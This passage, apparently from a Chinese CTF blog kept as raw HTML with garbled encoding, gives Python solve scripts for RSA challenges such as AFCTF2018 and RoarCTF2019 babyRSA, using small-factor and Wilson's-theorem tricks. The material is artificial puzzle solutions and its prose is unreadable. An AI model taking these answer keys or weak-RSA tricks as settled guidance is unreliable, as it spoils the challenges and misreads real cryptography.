class="hljs-char escape_">\x</span>b4<span class="hljs-char escape_">\x</span>9d.<span class="hljs-char escape_">\x</span>ca8<span class="hljs-char escape_">\x</span>02<span class="hljs-char escape_">\x</span>f2<span class="hljs-char escape_">\x</span>8b5<span class="hljs-char escape_">\x</span>82<span class="hljs-char escape_">\x</span>c5<span class="hljs-char escape_">\x</span>f6<span class="hljs-char escape_">\x</span>e6<span class="hljs-char escape_">\x</span>d9<span class="hljs-char escape_">\x</span>1ci<span class="hljs-char escape_">\x</span>c3r<span class="hljs-char escape_">\x</span>9a<span class="hljs-char escape_">\x</span>7f<span class="hljs-char escape_">\x</span>90k<span class="hljs-char escape_">\x</span>da<span class="hljs-char escape_">\x</span>15/<span class="hljs-char escape_">\x</span>aaM_<span class="hljs-char escape_">\x</span>a1<span class="hljs-char escape_">\x</span>18wY<span class="hljs-char escape_">\x</span>98<span class="hljs-char escape_">\x</span>a7<span class="hljs-char escape_">\x</span>bb<span class="hljs-char escape_">\x</span>e4vO<span class="hljs-char escape_">\x</span>a57H<span class="hljs-char escape_">\x</span>f6y@?k<span class="hljs-char escape_">\x</span>c2<span class="hljs-char escape_">\x</span>dd)<span class="hljs-char escape_">\x</span>f7<span class="hljs-char escape_">\x</span>0bvx&amp;<span class="hljs-char escape_">\x</span>d4H<span class="hljs-char escape_">\x</span>b1<span class="hljs-char escape_">\x</span>cf<span class="hljs-char escape_">\x</span>88<span class="hljs-char escape_">\x</span>f8<span class="hljs-char escape_">\x</span>90J<span class="hljs-char escape_">\x</span>a0f<span class="hljs-char escape_">\x</span>01]<span class="hljs-char escape_">\x</span>18<span class="hljs-char escape_">\x</span>f4<span class="hljs-char escape_">\x</span>f0YG-<span class="hljs-char escape_">\x</span>08<span class="hljs-char escape_">\x</span>08Jc<span class="hljs-char escape_">\x</span>eb<span class="hljs-char escape_">\x</span>16<span class="hljs-char escape_">\x</span>1bh<span class="hljs-char escape_">\x</span>be<span class="hljs-char escape_">\x</span>c3<span class="hljs-char escape_">\x</span>a9<span class="hljs-char escape_">\x</span>92<span class="hljs-char escape_">\x</span>a9D<span class="hljs-char escape_">\x</span>cc(<span class="hljs-char escape_">\x</span>1bt<span class="hljs-char escape_">\x</span>9e<span class="hljs-char escape_">\x</span>9a[g<span class="hljs-char escape_">\x</span>1eJ<span class="hljs-char escape_">\x</span>c5<span class="hljs-char escape_">\x</span>fc<span class="hljs-char escape_">\x</span>e7<span class="hljs-char escape_">\x</span>99<span class="hljs-char escape_">\x</span>cb<span class="hljs-char escape_">\x</span>aa<span class="hljs-char escape_">\x</span>f61D<span class="hljs-char escape_">\x</span>8d$<span class="hljs-char escape_">\x</span>f1<span class="hljs-char escape_">\x</span>ce<span class="hljs-char escape_">\&#x27;</span>0<span class="hljs-char escape_">\x</span>c5cuD<span class="hljs-char escape_">\x</span>88<span class="hljs-char escape_">\x</span>d8<span class="hljs-char escape_">\x</span>eb<span class="hljs-char escape_">\x</span>e9<span class="hljs-char escape_">\x</span>dd<span class="hljs-char escape_">\x</span>ac<span class="hljs-char escape_">\x</span>9cN<span class="hljs-char escape_">\x</span>c5-<span class="hljs-char escape_">\x</span>af<span class="hljs-char escape_">\x</span>1d<span class="hljs-char escape_">\x</span>de<span class="hljs-char escape_">\x</span>92<span class="hljs-char escape_">\x</span>eb<span class="hljs-char escape_">\x</span>e3)g<span class="hljs-char escape_">\x</span>e8<span class="hljs-char escape_">\r</span>;<span class="hljs-char escape_">\x</span>bc<span class="hljs-char escape_">\x</span>ab<span class="hljs-char escape_">\x</span>e6&#x27;</span><br></code></pre></td></tr></table></figure><p>ä¹‹ååˆ°ç½‘ä¸Šæœé¢˜è§£ï¼Œæ— ä¸€ä¾‹å¤–çš„éƒ½ç”¨äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">key = RSA.construct((n, e, d, p, q))<br>key = RSA.importKey(key.exportKey())<br>key = PKCS1_OAEP.new(key)<br>m = key.decrypt(c)<br></code></pre></td></tr></table></figure><p>æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆç”¨ä¸€èˆ¬çš„å†™ä¸å‡ºæ¥ï¼Œå¸Œæœ›æœ‰å¤§ä½¬å¯ä»¥æŒ‡ç‚¹ä¸€ä¸‹ï¼Œè¿™é‡Œå°±å…ˆæ­»è®°äº†ã€‚</p><p>æœ€åä¸Šä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">import</span> gmpy2<br><br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./[AFCTF2018]å¯æ€œçš„RSA/flag.enc&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>c=b64decode(flag)<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./[AFCTF2018]å¯æ€œçš„RSA/public.key&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>k=RSA.importKey(f)<br>n=k.n<br>e=k.e<br>p=<span class="hljs-number">3133337</span><br>q=n//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br>key = RSA.construct((n, e, <span class="hljs-built_in">int</span>(d), p, q))<br>key = RSA.importKey(key.exportKey())<br>key = PKCS1_OAEP.new(key)<br>m = key.decrypt(c)<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h2 id="RoarCTF2019-babyRSA">[RoarCTF2019]babyRSA</h2><p>å…ˆçœ‹é¢˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myGetPrime</span>():<br>    A= getPrime(<span class="hljs-number">513</span>)<br>    <span class="hljs-built_in">print</span>(A)<br>    B=A-random.randint(<span class="hljs-number">1e3</span>,<span class="hljs-number">1e5</span>)<br>    <span class="hljs-built_in">print</span>(B)<br>    <span class="hljs-keyword">return</span> sympy.nextPrime((B!)%A)<br>p=myGetPrime()<br><span class="hljs-comment">#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span><br><span class="hljs-comment">#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span><br><br>q=myGetPrime()<br><span class="hljs-comment">#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span><br><span class="hljs-comment">#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span><br><br>r=myGetPrime()<br><br>n=p*q*r<br><span class="hljs-comment">#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span><br>c=<span class="hljs-built_in">pow</span>(flag,e,n)<br><span class="hljs-comment">#e=0x1001</span><br><span class="hljs-comment">#c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span><br><span class="hljs-comment">#so,what is the flag?</span><br></code></pre></td></tr></table></figure><p>è¿™é“é¢˜çš„<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mo separator="true">,</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">n,e,c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span></span></span></span>éƒ½å·²ç»ç»™å‡ºï¼Œé‡ç‚¹å°±æ˜¯æ±‚<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p,q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>çš„å€¼ã€‚é‚£ä¹ˆå°±è§‚å¯Ÿ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>y</mi><mi>G</mi><mi>e</mi><mi>t</mi><mi>P</mi><mi>r</mi><mi>i</mi><mi>m</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">myGetPrime</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">G</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.13889em;">tP</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">im</span><span class="mord mathnormal">e</span></span></span></span>è¿™ä¸ªå‡½æ•°ï¼Œå‘ç°å®ƒåªéœ€è¦æ±‚å‡º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">!</mo></mrow><annotation encoding="application/x-tex">B!</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">!</span></span></span></span>å°±å¥½äº†ï¼Œè€Œä¸”<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>éƒ½å·²ç»ç»™å‡ºã€‚ä½†æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>çš„é˜¶ä¹˜éå¸¸å¤§ï¼Œå¯èƒ½è¦è´¹å¾ˆé•¿æ—¶é—´ï¼Œè·‘äº†ååˆ†é’Ÿæ²¡è·‘å‡ºæ¥ï¼Œä¹‹åå°±æœé¢˜è§£ï¼Œå‘ç°æ˜¯ç”¨å¨å°”é€Šå®šç†å†™çš„ï¼Œè¿™ä¸ªä¹‹å‰åœ¨ä¿¡å®‰æ•°å­¦åŸºç¡€å­¦äº†ä½†æ˜¯ç°åœ¨éƒ½å¿˜å…‰äº†ï¼Œçœ‹æ¥å¾—å¥½å¥½å¤ä¹ è¿™äº›åŸºç¡€çŸ¥è¯†ï¼Œé‚£ä¹ˆè¯ä¸å¤šè¯´ï¼Œç›´æ¥æ¥çœ‹æ­£ç¡®æ€è·¯ã€‚</p><p>å…ˆæ¥çœ‹çœ‹å¨å°”é€Šå®šç†è¯´äº†ä»€ä¹ˆï¼š</p><p>å¦‚æœ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>ä¸ºç´ æ•°ï¼Œé‚£ä¹ˆ</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mo>â‰¡</mo><mo>âˆ’</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">(p-1)!\equiv-1\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)!</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></span></p><p>ç”±è¿™ä¸ªå¨å°”é€Šå®šç†å¯ä»¥å¯¹è¿™ä¸ªé¢˜ç›®è¿›è¡Œè½¬æ¢ï¼š</p><p>é¦–å…ˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>A</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mo>â‰¡</mo><mo>âˆ’</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>A</mi></mrow><annotation encoding="application/x-tex">(A-1)!\equiv-1\mod{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)!</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span></span></span></span>ï¼Œæ­¤æ—¶ä»¤<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mfrac><mrow><mo stretchy="false">(</mo><mi>A</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo></mrow><mrow><mi>B</mi><mo stretchy="false">!</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">k=\frac{(A-1)!}{B!}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="mclose mtight">!</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">A</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span><span class="mclose mtight">)!</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>ï¼Œè¿™ä¸ª<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>è¦æ¯”<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">!</mo></mrow><annotation encoding="application/x-tex">B!</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">!</span></span></span></span>å¥½è®¡ç®—çš„å¤šï¼Œå®ƒç›¸å½“äº<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ä¹‹åï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>ä¹‹å‰çš„æ‰€æœ‰æ•°ç›¸ä¹˜</p><p>é‚£ä¹ˆæ­¤æ—¶çš„å…¬å¼å°±å¯ä»¥è½¬å˜æˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">!</mo><mo>âˆ—</mo><mi>k</mi><mo>â‰¡</mo><mo>âˆ’</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>A</mi></mrow><annotation encoding="application/x-tex">B!*k\equiv-1\mod{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span></span></span></span></p><p>æ‰¾åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>çš„é€†å…ƒï¼Œå°±å¯ä»¥æ±‚å‡º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">!</mo><mo>â‰¡</mo><mo>âˆ’</mo><msup><mi>k</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>A</mi></mrow><annotation encoding="application/x-tex">B!\equiv-k^{-1}\mod{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord">âˆ’</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span></span></span></span></p><p>è¿™æ ·å°±å¯ä»¥çœå¾ˆå¤šè®¡ç®—ï¼Œä¸Šä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myGetPrime</span>(<span class="hljs-params">A,B</span>):<br>    k=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(B+<span class="hljs-number">1</span>,A):<br>        k=k*i%A<br>    x=gmpy2.invert(k,A)<br>    xB=-x%A<br>    <span class="hljs-keyword">return</span> sympy.nextprime(xB)<br><br>A1=<span class="hljs-number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span><br>B1=<span class="hljs-number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span><br>p=myGetPrime(A1,B1)<br><br>A2=<span class="hljs-number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span><br>B2=<span class="hljs-number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span><br>q=myGetPrime(A2,B2)<br><br>n=<span class="hljs-number">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span><br><br>r=(n//p)//q<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)<br>e=<span class="hljs-number">0x1001</span><br>d=gmpy2.invert(e,phi)<br>c=<span class="hljs-number">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span><br><br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>flag=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="RSA-what">RSA &amp; what</h2><p>è¿™é“é¢˜ä¹Ÿä¸ç®—éš¾ï¼Œä½†æ˜¯æœ€åæœ‰ä¸ªbase64éšå†™ä¹‹å‰æ²¡è§è¿‡ï¼Œå¸å–çº¿ä¸‹èµ›ç»éªŒï¼ŒæŠŠå®ƒè®°åˆ°åšå®¢ä¸Šã€‚</p><p>é¦–å…ˆé¢˜ç›®ç»™å‡ºäº†å››ä¸ªæ–‡ä»¶</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/RSA&amp;What_1.png" alt="RSA&amp;What_1"></p><p>çœ‹ç»™å‡ºçš„ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 